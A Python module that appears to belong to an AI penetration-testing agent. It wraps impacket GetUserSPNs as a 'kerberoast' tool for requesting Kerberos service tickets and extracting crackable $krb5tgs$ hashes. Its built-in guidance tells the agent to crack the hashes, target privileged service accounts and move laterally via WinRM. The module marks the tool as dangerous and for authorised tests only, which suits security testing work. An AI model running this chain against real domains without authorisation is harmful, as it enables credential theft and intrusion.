"""GetUserSPNs 深度定制：Kerberoasting 域渗透（危险操作，触发确认）。"""

from __future__ import annotations

import re
from typing import Any

from .base import ToolProfile, check_installed, sanitize_target

SCHEMAS: list[dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "kerberoast",
            "description": (
                "用 impacket GetUserSPNs 做 Kerberoasting："
                "请求域内服务账户的 TGS 票据并导出可离线破解的 $krb5tgs$ hash。"
                "⚠ 危险操作：会触发确认弹窗；需要一组域凭据。仅授权测试。"
                "拿到的 hash 用 crack_hash 破解（类型 krb5tgs）。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "domain": {"type": "string", "description": "域名，如 corp.local"},
                    "username": {"type": "string", "description": "域用户（任何普通账户即可）"},
                    "password": {"type": "string", "description": "密码"},
                    "dc": {"type": "string", "description": "域控 IP（可选）"},
                    "spns": {
                        "type": "string",
                        "description": "只对指定 SPN 请求（可选），如 MSSQLSvc/db.corp.local:1433",
                    },
                },
                "required": ["domain", "username", "password"],
            },
        },
    },
]

_USER_RE = re.compile(r"^[\w.\-\\$]{1,64}$")
_PASS_RE = re.compile(r"^[\w.\-\\$@!]{1,128}$")  # 密码允许 @（impacket 从右解析分隔符）
_SPN_RE = re.compile(r"^[\w./:\-]{1,200}$")


def _bin() -> str:
    for name in ("impacket-GetUserSPNs", "GetUserSPNs.py"):
        if check_installed(name):
            return name
    return ""


def _build_cmd(args: dict[str, Any]) -> tuple[str, int]:
    domain = str(args.get("domain") or "").strip()
    if not re.fullmatch(r"[\w.-]{1,128}", domain):
        raise ValueError(f"domain 格式非法: {domain!r}")
    username = str(args.get("username") or "").strip()
    password = str(args.get("password") or "").strip()
    if not _USER_RE.match(username):
        raise ValueError(f"username 含非法字符: {username!r}")
    if not _PASS_RE.match(password):
        raise ValueError(f"password 含非法字符: {password!r}")
    dc = str(args.get("dc") or "").strip()
    if dc:
        sanitize_target(dc)
    spn = str(args.get("spns") or "").strip()
    if spn and not _SPN_RE.match(spn):
        raise ValueError(f"spns 格式非法: {spn!r}")

    bin_ = _bin()
    if not bin_:
        return "", 0
    parts = [bin_]
    if dc:
        parts += ["-dc-ip", dc]
    parts += ["-request", f"{domain}/{username}:{password}"]
    if spn:
        parts += ["-spn", spn]
    parts.append("-format hashcat")
    return " ".join(parts), 300


class GetUserSPNsProfile(ToolProfile):
    name = "getuserspns"
    aliases = ["kerberoast", "getuserspns", "tgs", "服务账户"]
    summary = "Kerberoasting"
    lore = """### GetUserSPNs 深度使用要点
- 定位：有一组任意域凭据后即可做；服务账户的 TGS 票据用其密码加密，可离线爆破。
- 输出 `$krb5tgs$` hash 用 crack_hash 破解（hashcat -m 13100 / john krb5tgs）。
- 优先破解高权限服务账户（如 MSSQL/HTTP 服务账户常被加入本地管理员组）。
- 大域里服务账户多：破解出的密码尝试 winrm_exec 登录服务主机横向。
- 与 asrep_roast 互补：AS-REP 不需要凭据但碰运气；Kerberoasting 需要凭据但命中率高。"""
    extra_schemas = SCHEMAS

    async def exec_kerberoast(self, ex: Any, args: dict[str, Any]) -> str:
        if not _bin():
            return "impacket-GetUserSPNs 未安装（apt install python3-impacket）。"
        cmd, timeout = _build_cmd(args)
        raw = await self._run(ex, cmd, timeout=timeout)
        hashes = [l.strip() for l in raw.splitlines() if "$krb5tgs$" in l]
        if hashes:
            head = [f"🎯 TGS hash ({len(hashes)}):"] + hashes[:10]
            head.append("下一步：crack_hash 破解（类型 krb5tgs），破解后横向。")
        else:
            head = ["未获取到 TGS hash（凭据无效或无服务账户）"]
        return self._summary(raw, head, tail=30)
